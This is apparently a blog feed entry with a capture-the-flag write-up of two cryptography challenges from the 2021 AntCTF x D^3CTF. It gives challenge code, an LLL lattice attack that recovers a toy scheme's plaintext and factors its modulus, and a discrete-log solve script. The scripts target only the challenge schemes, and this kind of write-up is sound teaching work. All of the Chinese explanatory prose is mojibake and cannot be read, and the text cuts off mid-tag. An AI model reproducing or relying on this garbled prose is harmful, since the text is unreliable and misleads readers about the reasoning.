    <link href="http://tearsjin.github.io/2021/03/08/writeup-for-2021AntCTFxD-3CTF/"/>
    <id>http://tearsjin.github.io/2021/03/08/writeup-for-2021AntCTFxD-3CTF/</id>
    <published>2021-03-08T11:08:34.000Z</published>
    <updated>2021-03-14T12:11:37.662Z</updated>
    
    <content type="html"><![CDATA[<p>å•Šè¿™æ¬¡çš„è¿™ä¸ªæ¯”èµ›å› ä¸ºä¸ä¼šLattice, å¯¼è‡´åŸºæœ¬ä¸ä¼šåšå•Š, è™½ç„¶æ¯”èµ›ååŠæ®µå»å­¦äº†ä¹Ÿè¯•ç€åšäº†, è™½ç„¶æ ¼å­é€ å‡ºæ¥è¿˜è¢«è‡ªå·±è ¢åˆ°äº†, ä½†è¿˜æ˜¯â€¦æ”¶è·å¾ˆå¤šhh</p><p>è®°å½•ä¸€ä¸‹å§</p><h1 id="babylattice"><a href="#babylattice" class="headerlink" title="babylattice"></a>babylattice</h1><p>å½“æ—¶åšé¢˜çš„æ—¶å€™å®Œå…¨æ²¡æœ‰çœ‹åˆ°æ˜æ–‡å°±æ˜¯ä¸€ä¸ªæ•°å­—, å¹¶ä¸èƒ½è½¬æ¢æˆæœ‰è¯­ä¹‰çš„å­—ç¬¦ä¸²â€¦.å¯¼è‡´æ ¼å­éƒ½é€ å‡ºæ¥äº†è¿˜ä¸€ç›´å¡ç€<br>ä½†ä¹Ÿä½“ä¼šåˆ°äº†ä¸€äº›é€ æ ¼å­çš„æ–¹æ³•, ä»¥åŠæ ¼çº¦å‡ºå‘é‡åéœ€è¦æ³¨æ„çš„åœ°æ–¹</p><h2 id="problem"><a href="#problem" class="headerlink" title="problem"></a>problem</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> namedtuple</span><br><span class="line">PublicKey = namedtuple(<span class="string">&#x27;PublicKey&#x27;</span>, [<span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;b&#x27;</span>])</span><br><span class="line">SecretKey = namedtuple(<span class="string">&#x27;SecretKey&#x27;</span>, [<span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;A&#x27;</span>])</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_key</span>():</span></span><br><span class="line">    p = random_prime(<span class="number">2</span>^<span class="number">512</span>, lbound=<span class="number">2</span>^<span class="number">511</span>)</span><br><span class="line">    q = random_prime(<span class="number">2</span>^<span class="number">512</span>, lbound=<span class="number">2</span>^<span class="number">511</span>)</span><br><span class="line">    n = p * q</span><br><span class="line">    a11, a12, a21 = [random_prime(<span class="number">2</span>^<span class="number">100</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">    a22 = random_prime(<span class="number">2</span>^<span class="number">100</span>)</span><br><span class="line">    <span class="keyword">while</span> a11 * a22 == a12 * a21:</span><br><span class="line">        a22 = random_prime(<span class="number">2</span>^<span class="number">100</span>)</span><br><span class="line">    A = Matrix(ZZ, [[a11, a12], [a21, a22]])</span><br><span class="line">    a1 = crt([a11, a21], [p, q])</span><br><span class="line">    a2 = crt([a12, a22], [p, q])</span><br><span class="line">    b = a1 * inverse_mod(a2, n) % n</span><br><span class="line">    PK = PublicKey(n, b)</span><br><span class="line">    SK = SecretKey(p, q, A)</span><br><span class="line">    <span class="keyword">return</span> (PK, SK)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">m, pk</span>):</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="number">0</span> &lt; m &lt; <span class="number">2</span>^<span class="number">400</span></span><br><span class="line">    r = randint(<span class="number">0</span>, <span class="number">2</span>^<span class="number">400</span>-<span class="number">1</span>)</span><br><span class="line">    c = (pk.b*m + r) % pk.n</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">c, sk</span>):</span></span><br><span class="line">    a2 = crt([sk.A[<span class="number">0</span>,<span class="number">1</span>], sk.A[<span class="number">1</span>,<span class="number">1</span>]], [sk.p, sk.q])</span><br><span class="line">    s1 = a2 * c % sk.p</span><br><span class="line">    s2 = a2 * c % sk.q</span><br><span class="line">    m, r = sk.A.solve_right(vector([s1, s2]))</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>(<span class="params">pk, sk, num=<span class="number">3</span></span>):</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">        m = randint(<span class="number">0</span>, <span class="number">2</span>^<span class="number">400</span>-<span class="number">1</span>)</span><br><span class="line">        c = encrypt(m, pk)</span><br><span class="line">        mm = decrypt(c, sk)</span><br><span class="line">        <span class="keyword">assert</span> m == mm</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line">    <span class="keyword">from</span> secret <span class="keyword">import</span> m, FLAG</span><br><span class="line">    <span class="keyword">assert</span> FLAG == <span class="string">&#x27;d3ctf&#123;%s&#125;&#x27;</span> % sha256(<span class="built_in">int</span>(m).to_bytes(<span class="number">50</span>, <span class="string">&#x27;big&#x27;</span>)).hexdigest()</span><br><span class="line">    PK, SK = gen_key()</span><br><span class="line">    test(PK, SK)</span><br><span class="line">    c = encrypt(m, PK)</span><br><span class="line">    print(<span class="string">f&quot;PK = <span class="subst">&#123;PK&#125;</span>&quot;</span>)</span><br><span class="line">    print(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">PK = PublicKey(n=69804507328197961654128697510310109608046244030437362639637009184945533884294737870524186521509776189989451383438084507903660182212556466321058025788319193059894825570785105388123718921480698851551024108844782091117408753782599961943040695892323702361910107399806150571836786642746371968124465646209366215361, b=65473938578022920848984901484624361251869406821863616908777213906525858437236185832214198627510663632409869363143982594947164139220013904654196960829350642413348771918422220404777505345053202159200378935309593802916875681436442734667249049535670986673774487031873808527230023029662915806344014429627710399196)</span></span><br><span class="line"><span class="string">c = 64666354938466194052720591810783769030566504653409465121173331362654665231573809234913985758725048071311571549777481776826624728742086174609897160897118750243192791021577348181130302572185911750797457793921069473730039225991755755340927506766395262125949939309337338656431876690470938261261164556850871338570</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="å‡ºç°çš„å‚æ•°"><a href="#å‡ºç°çš„å‚æ•°" class="headerlink" title="å‡ºç°çš„å‚æ•°"></a>å‡ºç°çš„å‚æ•°</h2><ul><li>$m$: æ˜æ–‡, $m \in (0,2^{400})$</li><li>$c = m \cdot b + r \ (mod\ n)$ : å¯†æ–‡, å…¶ä¸­$r \in (0,2^{400})$</li><li>$A = \begin{pmatrix} a_{11}&amp;a_{21}\\a_{12}&amp;a_{22}\end{pmatrix}$å››ä¸ª$a$éƒ½æ˜¯100-Bit</li><li>$p,q$: 512-Bit prime</li><li>$a1 = crt([a11, a21], [p, q])\ a2 = crt([a12, a22], [p, q])$</li><li>$b = a_1 \cdot a_2^{-1} mod \ n$</li></ul><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>ç”±$c = m \cdot b + r (mod \ n)$å¯ä»¥å¾—åˆ°$c = m \cdot b + r + \mu n$</p><p>ç§»é¡¹æœ‰$c - m \cdot b - \mu n = r$</p><p>è€ƒè™‘åˆ°$m,r$éƒ½æ˜¯æœªçŸ¥çš„, è€Œä¸”éƒ½æ˜¯400ä½ä»¥ä¸‹, å°è¯•æ„é€ æ ¼å­å°†$m,r$è§„çº¦å‡ºæ¥</p><p>è¿™é‡Œçš„å¼å­å·¦è¾¹æœ‰ä¸‰ä¸ªé¡¹, æ‰€ä»¥æ„é€ ä¸€ä¸ª3ç»´çš„æ ¼å­</p><p>å› ä¸ºæ˜¯ä¸‰ç»´çš„æ ¼å­, æ‰€ä»¥æœ€çŸ­å‘é‡çš„å¤§å°å¤§æ¦‚æ˜¯$det(\mathcal L)^{1/3}$</p><p>è€Œ$m,r \leq 2^{400}$, æ‰€ä»¥éœ€è¦å°†æ ¼å­çš„$Det$æ”¾å¤§ä¸€ç‚¹<br>$$<br>\begin{pmatrix}<br>2^{200}&amp;0&amp;c\\<br>0&amp;1&amp;-b\\<br>0&amp;0&amp;-n<br>\end{pmatrix}<br>$$<br>é‚£ä¹ˆä¼šæœ‰<br>$$<br>(1 ,m,\mu)<br>\begin{pmatrix}<br>2^{200}&amp;0&amp;c\\<br>0&amp;1&amp;-b\\<br>0&amp;0&amp;-n<br>\end{pmatrix}<br>=<br>(2^{200},m,r)<br>$$<br>å³,å­˜åœ¨ä¸€ä¸ªæ ¼ç‚¹$(2^{200},m,r)$, ç”¨LLLè§„çº¦å³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">69804507328197961654128697510310109608046244030437362639637009184945533884294737870524186521509776189989451383438084507903660182212556466321058025788319193059894825570785105388123718921480698851551024108844782091117408753782599961943040695892323702361910107399806150571836786642746371968124465646209366215361</span></span><br><span class="line">b = <span class="number">65473938578022920848984901484624361251869406821863616908777213906525858437236185832214198627510663632409869363143982594947164139220013904654196960829350642413348771918422220404777505345053202159200378935309593802916875681436442734667249049535670986673774487031873808527230023029662915806344014429627710399196</span></span><br><span class="line">c = <span class="number">64666354938466194052720591810783769030566504653409465121173331362654665231573809234913985758725048071311571549777481776826624728742086174609897160897118750243192791021577348181130302572185911750797457793921069473730039225991755755340927506766395262125949939309337338656431876690470938261261164556850871338570</span></span><br><span class="line"></span><br><span class="line">v1 = vector(ZZ, [<span class="number">2</span>^<span class="number">200</span>, <span class="number">0</span>,c])</span><br><span class="line">v2 = vector(ZZ, [<span class="number">0</span>, <span class="number">1</span>,-b])</span><br><span class="line">v3 = vector(ZZ, [<span class="number">0</span>, <span class="number">0</span>,-n])</span><br><span class="line">Lattice = matrix([v1,v2,v3])</span><br><span class="line">m = <span class="built_in">abs</span>(Lattice.LLL()[<span class="number">0</span>][<span class="number">1</span>])</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line">print( <span class="string">&#x27;d3ctf&#123;%s&#125;&#x27;</span> % sha256(m).hexdigest())</span><br></pre></td></tr></table></figure><p>æ³¨æ„åˆ°å®é™…æ ¼çº¦å‡ºæ¥çš„å‘é‡æ˜¯å…¨è´Ÿçš„, å› ä¸º$(-2^{200},-m,-r)$ä¹Ÿåœ¨æ ¼å­é‡Œé¢, æ‰€ä»¥è®°å¾—åŠ ä¸ª<code>abs()</code></p><h2 id="é¢„æœŸè§£"><a href="#é¢„æœŸè§£" class="headerlink" title="é¢„æœŸè§£"></a>é¢„æœŸè§£</h2><p>è¿™æ¬¡çš„é¢˜ç¬¬ä¸€é¢˜å¦‚æœä¸æ˜¯åšçš„é¢„æœŸè§£é‚£ä¹ˆç¬¬äºŒé¢˜å°±ä¼šç‰¹åˆ«çš„éš¾, æ‰€ä»¥ä¹Ÿé¡ºä¾¿å­¦ä¹ äº†ä¸€ä¸‹é¢„æœŸè§£çš„åšæ³•(<del>å‡ºé¢˜äººé¢„æœŸäº†éé¢„æœŸè§£</del></p><p>å¦‚æœä¸ä»$c = b \cdot m + r (mod \ n)$å…¥æ‰‹çš„è¯, å°±å…ˆçœ‹çœ‹å‰é¢å‡ ä¸ªå‚æ•°çš„å…³ç³»<br>$$<br>\begin{array}{}<br>a_1 \equiv a_{11} \ (mod \ p)\\<br>a_1 \equiv a_{21} \ (mod \ q)\\<br>\end{array}\quad<br>\begin{array}{}<br>a_2 \equiv a_{12} \ (mod \ p)\\<br>a_2 \equiv a_{22} \ (mod \ q)\\<br>\end{array}\quad<br>b \equiv a_1 \cdot a_2^{-1} \ (mod \ n)<br>$$<br>ä¸Šé¢è¿™ä¸‰ä¸ªå¼å­, å¯ä»¥å¾—åˆ°è¿™ä¹ˆä¸€ä¸ªæ–¹ç¨‹ç»„<br>$$<br>\begin{array}{}<br>a_{12} \cdot b = a_{11} + k_1p \\<br>a_{22} \cdot b = a_{21} + k_2q<br>\end{array}<br>$$<br>åšåˆ°è¿™é‡Œçš„æ—¶å€™, æœ‰æƒ³è¿‡æŠŠæ–¹ç¨‹ç»„çš„ä¸¤ä¸ªå¼å­ç›¸ä¹˜, å¾—åˆ°çš„ä¼šæ˜¯<br>$$<br>a_{12}a_{22}b^2 = a_{11}a_{21} + k_2a_{11}q + k_1a_{21}p + k_1k_2pq<br>$$<br>ä½†æ˜¯è¿™é‡Œå·²çŸ¥çš„é‡åªæœ‰$b,pq$, ä¹Ÿå°±æ˜¯è¯´åœ¨è¿™ä¸ªå¼å­é‡Œ, æœ‰ä¸‰é¡¹ä¸€ä¸ªå·²çŸ¥çš„éƒ½æ²¡æœ‰, è¿™æ ·æ˜¯æ²¡åŠæ³•é€ æ ¼å­çš„, åˆ°è¿™é‡Œå°±å¡ä½äº†, ä¸å¾—ä¸ç¿»çœ‹wp, æ‰å‘ç°, åŸæ¥å¯ä»¥æŠŠ$a_{11}, a_{21}$ç§»åˆ°å·¦è¾¹å†ç›¸ä¹˜, è¿™æ ·å°±åªæœ‰ä¸€ä¸ªé¡¹æ˜¯æœªçŸ¥çš„äº†!<br>$$<br>\begin{array}{}<br>a_{12} \cdot b - a_{11} = k_1p \\<br>a_{22} \cdot b - a_{21} = k_2q<br>\end{array}<br>\Rightarrow<br>a_{12}a_{22}b^2 - b(a_{12}a_{21} + a_{11}a_{22}) + a_{11}a_{21} = k_1k_2pq<br>$$<br>è®°$K = k_1k_2,n = pq$å†ç§»ä¸€ä¸‹é¡¹<br>$$<br>a_{12}a_{22}b^2 - b(a_{12}a_{21} + a_{11}a_{22}) - Kn = -a_{11}a_{21}<br>$$<br>ç„¶åå°±æ˜¯å–œé—»ä¹è§çš„é€ æ ¼å­<br>$$<br>(a_{12}a_{22}, -(a_{12}a_{21}+a_{11}a_{22}), -K)<br>\begin{pmatrix}<br>1&amp;0&amp;b^2\\<br>0&amp;-1&amp;b\\<br>0&amp;0&amp;n<br>\end{pmatrix}<br>=<br>(a_{12}a_{22}, a_{12}a_{21}+a_{11}a_{22}, -a_{11}a_{21})<br>$$<br>å¯ä»¥çœ‹åˆ°å³ä¾§çš„å‘é‡é•¿åº¦å¾ˆçŸ­, å¯ä»¥è§„çº¦å‡ºæ¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(1173142580751247504024100371706709782500216511824162516724129,1382843159437215516163973075066558157591473749635266665605630,-211380743487233628797755584958526337321408979158793229985661)</span><br></pre></td></tr></table></figure><p>å› ä¸ºå››ä¸ª$a$éƒ½æ˜¯100ä½çš„ç´ æ•°, ç›´æ¥ç”¨<a href="http://www.factordb.comåˆ†è§£/">http://www.factordb.comåˆ†è§£</a><br>$$<br>1018979931854255696816714991181\\<br>1151291153120610849180830073509\\<br>207806651167586080788016046729\\<br>1017199123798810531137951821909<br>$$<br>å› ä¸º$gcd(a_{12} \cdot b - a_{11} , n) = p$, çŒœä¸€ä¸‹ä¸Šé¢å››ä¸ªæ•°å“ªä¸¤ä¸ªæ˜¯$a_{12},a_{11}$å°±å¯ä»¥å¾—åˆ°$p$äº†, å¾—åˆ°$p$å°±å¯ä»¥åˆ†è§£$n$, ç›´æ¥å¾—åˆ°æ‰€æœ‰çš„å‚æ•°, è·‘è§£å¯†ç®—æ³•å°±å¯ä»¥å¾—åˆ°æ˜æ–‡äº†</p><h1 id="simpleGroup"><a href="#simpleGroup" class="headerlink" title="simpleGroup"></a>simpleGroup</h1><p>è¿™é¢˜æ¯”èµ›çš„æ—¶å€™ä¹Ÿæ²¡åšå‡ºæ¥(ç¬¬ä¸€é¢˜éƒ½åšä¸å‡ºæ€ä¹ˆåšè¿™é¢˜), æ¯”å®Œèµ›åšäº†ç¬¬ä¸€é¢˜æ‰åšè¿™é¢˜<br>å•Šå•Šå•Šä½†æ˜¯å› ä¸ºå¤ªä¹…æ²¡åšæ¬¡å¹‚çš„è¿ç®—å¯¼è‡´åšäº†å¥½ä¹…â€¦â€¦.</p><h2 id="problem-1"><a href="#problem-1" class="headerlink" title="problem"></a>problem</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> FLAG</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># A gift for key recovery in challenge [babyLattice]</span></span><br><span class="line">n = <span class="number">69804507328197961654128697510310109608046244030437362639637009184945533884294737870524186521509776189989451383438084507903660182212556466321058025788319193059894825570785105388123718921480698851551024108844782091117408753782599961943040695892323702361910107399806150571836786642746371968124465646209366215361</span></span><br><span class="line">y = <span class="number">12064801545723347322936991186738560311049061235541031580807549422258814170771738262264930441670708308259694588963224372530498305648578520552038029773849342206125074212912788823834152785756697757209804475031974445963691941515756901268376267360542656449669715367587909233618109269372332127072063171947435639328</span></span><br><span class="line">e = <span class="number">1928983487</span></span><br><span class="line"></span><br><span class="line">M = <span class="built_in">int</span>.from_bytes(FLAG, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">C = []</span><br><span class="line"><span class="keyword">while</span> M != <span class="number">0</span>:</span><br><span class="line">    m = M % e</span><br><span class="line">    M //= e</span><br><span class="line">    r = randint(<span class="number">0</span>, n-<span class="number">1</span>)</span><br><span class="line">    c = power_mod(y, m, n) * power_mod(r, e, n)</span><br><span class="line">    C.append(c % n)</span><br><span class="line"></span><br><span class="line">print(<span class="string">f&quot;C = <span class="subst">&#123;C&#125;</span>&quot;</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">C = [63173987757788284988620600191109581820396865828379773315280703314093571300861961873159324234626635582246705378908610341772657840682572386153960342976445563045427986000105931341168525422286612417662391801508953619857648844420751306271090777865836201978470895906780036112804110135446130976275516908136806153488, 9763526786754236516067080717710975805995955013877681492195771779269768465872108434027813610978940562101906769209984501196515248675767910499405415921162131390513502065270491854965819776080041506584540996447044249409209699608342257964093713589580983775580171905489797513718769578177025063630080394722500351718, 37602000735227732258462226884765737048138920479521815995321941033382094711120810035265327876995207117707635304728511052367297062940325564085193593024741832905771507189762521426736369667607865137900432117426385504101413622851293642219573920971637080154905579082646915297543490131171875075081464735374022745371, 1072671768043618032698040622345664216689606325179075270470875647188092538287671951027561894188700732117175202207361845034630743422559130952899064461493359903596018309221581071025635286144053941851624510600383725195476917014535032481197737938329722082022363122585603600777143850326268988298415885565240343957, 27796821408982345007197248748277202310092789604135169328103109167649193262824176309353412519763498156841477483757818317945381469765077400076181689745139555466187324921460327576193198145058918081061285618767976454153221256648341316332169223400180283361166887912012807743326710962143011946929516083281306203120, 27578857139265869760149251280906035333246393024444009493717159606257881466594628022512140403127178174789296810502616834123420723261733024810610501421455454191654733275226507268803879479462533730695515454997186867769363797096196096976825300792616487723840475500246639213793315097434400920355043141319680299224, 29771574667682104634602808909981269404867338382394257360936831559517858873826664867201410081659799334286847985842898792091629138292008512383903137248343194156307703071975381090326280520578349920827357328925184297610245746674712939135025013001878893129144027068837197196517160934998930493581708256039240833145, 33576194603243117173665354646070700520263517823066685882273435337247665798346350495639466826097821472152582124503891668755684596123245873216775681469053052037610568862670212856073776960384038120245095140019195900547005026888186973915360493993404372991791346105083429461661784366706770467146420310246467262823, 5843375768465467361166168452576092245582688894123491517095586796557653258335684018047406320846455642101431751502161722135934408574660609773328141061123577914919960794180555848119813522996120885320995386856042271846703291295871836092712205058173403525430851695443361660808933971009396237274706384697230238104, 61258574367240969784057122450219123953816453759807167817741267194076389100252707986788076240792732730306129067314036402554937862139293741371969020708475839483175856346263848768229357814022084723576192520349994310793246498385086373753553311071932502861084141758640546428958475211765697766922596613007928849964, 13558124437758868592198924133563305430225927636261069774349770018130041045454468021737709434182703704611453555980636131119350668691330635012675418568518296882257236341035371057355328669188453984172750580977924222375208440790994249194313841200024395796760938258751149376135149958855550611392962977597279393428]</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><h2 id="åˆ†æ-1"><a href="#åˆ†æ-1" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>$n$ ç”¨çš„è¿˜æ˜¯ç¬¬ä¸€é¢˜çš„, æ‰€ä»¥ç¬¬ä¸€é¢˜åˆ†è§£å‡ºæ¥çš„$p,q$è¿™é¢˜å°±æœ‰ç”¨äº†</p><p>åŠ å¯†çš„å¼å­å¤§æ¦‚æ˜¯$c_i = y^{m_i} \cdot r^{e} \ (mod \ n)$ ,$c,y,e$éƒ½æ˜¯å·²çŸ¥çš„, è€Œä¸”$m_i &lt; e$</p><p>å› ä¸º$r$æ˜¯ä¸çŸ¥é“çš„, è‚¯å®šè¦æƒ³åŠæ³•æ¶ˆå»$r$ , (æœ‰çš„å¸ˆå‚…ä¸æ¶ˆå»$r$ä¹Ÿå¯ä»¥åš, å¾…ä¼šä¸‹é¢è¡¥å……ä¸€ä¸‹)</p><p>è¿™é‡Œçš„$e$æ¯”è¾ƒç‰¹æ®Š, $gcd(e, (p-1)(q-1)) =e $</p><p>è¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥ç›´æ¥è®¡ç®—ä¸€ä¸ª$d = {phi \over e}$, ä½¿å¾—$r^{ed} = r^{phi} = 1 (mod \ n)$, æ¬§æ‹‰å®šç†yyds</p><p>åŠ å¯†çš„å¼å­ä¸¤è¾¹æ¥ä¸ª$d$æ¬¡å¹‚, å°±ä¼šæœ‰<br>$$<br>c_i^d = y^{md} \ (mod \ n)<br>$$<br>åšåˆ°è¿™é‡Œæƒ³æŠŠ$d$æ¶ˆå»å†ç”¨bsgsæ±‚ç¦»æ•£å¯¹æ•°, ä½†å› ä¸º$d  \ mod \ phi$æ²¡æœ‰é€†å…ƒå¡äº†å¥½ä¹…, çœŸçš„è ¢â€¦</p><p>è¿™é‡Œ$y$æ˜¯å·²çŸ¥çš„, ç›´æ¥çœ‹æˆ$c_i^d = (y^{d})^m \ (mod \ n)$, ç”¨bsgså°±å®Œäº‹äº†(ç”¨bsgsæ˜¯å› ä¸ºmçš„èŒƒå›´æ˜¯å·²çŸ¥çš„)</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line">n=<span class="number">69804507328197961654128697510310109608046244030437362639637009184945533884294737870524186521509776189989451383438084507903660182212556466321058025788319193059894825570785105388123718921480698851551024108844782091117408753782599961943040695892323702361910107399806150571836786642746371968124465646209366215361</span></span><br><span class="line">y = <span class="number">12064801545723347322936991186738560311049061235541031580807549422258814170771738262264930441670708308259694588963224372530498305648578520552038029773849342206125074212912788823834152785756697757209804475031974445963691941515756901268376267360542656449669715367587909233618109269372332127072063171947435639328</span></span><br><span class="line">e = <span class="number">1928983487</span></span><br><span class="line">C = [...]</span><br><span class="line"></span><br><span class="line">a11 = <span class="number">207806651167586080788016046729</span></span><br><span class="line">a12 = <span class="number">1151291153120610849180830073509</span></span><br><span class="line">p = gcd(b * a12 - a11,n)</span><br><span class="line">q = n // p</span><br><span class="line">phi = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line">M = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> gcd(e,phi) == e</span><br><span class="line">d = phi // e</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">pow</span>(<span class="built_in">pow</span>(randint(<span class="number">0</span>,n-<span class="number">1</span>),e,n),d,n) == <span class="number">1</span></span><br><span class="line"></span><br><span class="line">bounds = ( <span class="number">1</span>,e )</span><br><span class="line">F = IntegerModRing(n)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> C:</span><br><span class="line">    cd = <span class="built_in">pow</span>(i,d,n)</span><br><span class="line">    yd = <span class="built_in">pow</span>(y,d,n)</span><br><span class="line">    M.append(bsgs(F(yd),F(cd),bounds))</span><br><span class="line"></span><br><span class="line">flag = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> M[::-<span class="number">1</span>]:</span><br><span class="line">    flag = <span class="built_in">int</span>(flag) * <span class="built_in">int</span>(e) + <span class="built_in">int</span>(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line">print(long_to_bytes(flag))</span><br></pre></td></tr></table></figure><h2 id="ä¸ç”¨æ¶ˆå»-r-çš„è§£"><a href="#ä¸ç”¨æ¶ˆå»-r-çš„è§£" class="headerlink" title="ä¸ç”¨æ¶ˆå»$r$çš„è§£"></a>ä¸ç”¨æ¶ˆå»$r$çš„è§£</h2><p><a href="https://www.anquanke.com/post/id/233827#h2-4">https://www.anquanke.com/post/id/233827#h2-4</a>, è¿™ä½å¸ˆå‚…åšçš„</p><p>ä¸€æ ·å…ˆçœ‹ä¸€ä¸‹åŠ å¯†çš„å¼å­$c = y^{m} \cdot r^{e} \ (mod \ n)$</p><p>è¿™é¢˜æœ‰ä¸€ä¸ªç‰¹æ®Šçš„ç‚¹å°±æ˜¯$e$å¯ä»¥è¢«åˆ†è§£ä¸º$e_1$å’Œ$e_2$ä¸¤ä¸ªç´ æ•°ï¼Œè¿™ä¸¤ä¸ªç´ æ•°åˆåˆ†åˆ«æ˜¯$p-1$å’Œ$q-1$çš„å› å­</p><p>æ‰€ä»¥ä¼šæœ‰<br>$$<br>m = i \cdot e_1 + j \\<br>c \equiv y^{j} \cdot (y^{i} \cdot r^{e_2})^{e_1} \ (mod \ p) \\<br>câ€™ \equiv c \cdot y^{-j} \equiv (y_i \cdot r^{e_2})^{e_1} \ (mod \ p)<br>$$<br>å› ä¸º$j$æ˜¯ä¸€ä¸ªæ¯”è¾ƒå°çš„æ•°, å¯ä»¥é€šè¿‡éå†$j$, å†åˆ¤æ–­$c \cdot y^{-j}$æ˜¯å¦æ˜¯$p$çš„$e_1$æ¬¡å‰©ä½™, å°±å¯ä»¥å¾—åˆ°$m \ mod \ e_1$</p><p>åŒç†æˆ‘ä»¬ä¹Ÿå¯ä»¥å¾—åˆ°$m \ mod \ e_2$</p><p>å†é€šè¿‡ä¸­å›½å‰©ä½™å®šç†å°±èƒ½å¾—åˆ°$m$äº†</p><p>è¿™é‡Œæœ‰ä¸ªç´ æ•°æ¨¡çš„$n$æ¬¡å‰©ä½™çš„åˆ¤æ–­æ–¹æ³•, å¾ˆç®€å•, $x$ ä¸ºæ¨¡$p$çš„$n$æ¬¡å‰©ä½™çš„å……è¦æ¡ä»¶ä¸º<br>$$<br>x^{p-1} \equiv 1 \ (mod \ p)<br>$$</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" 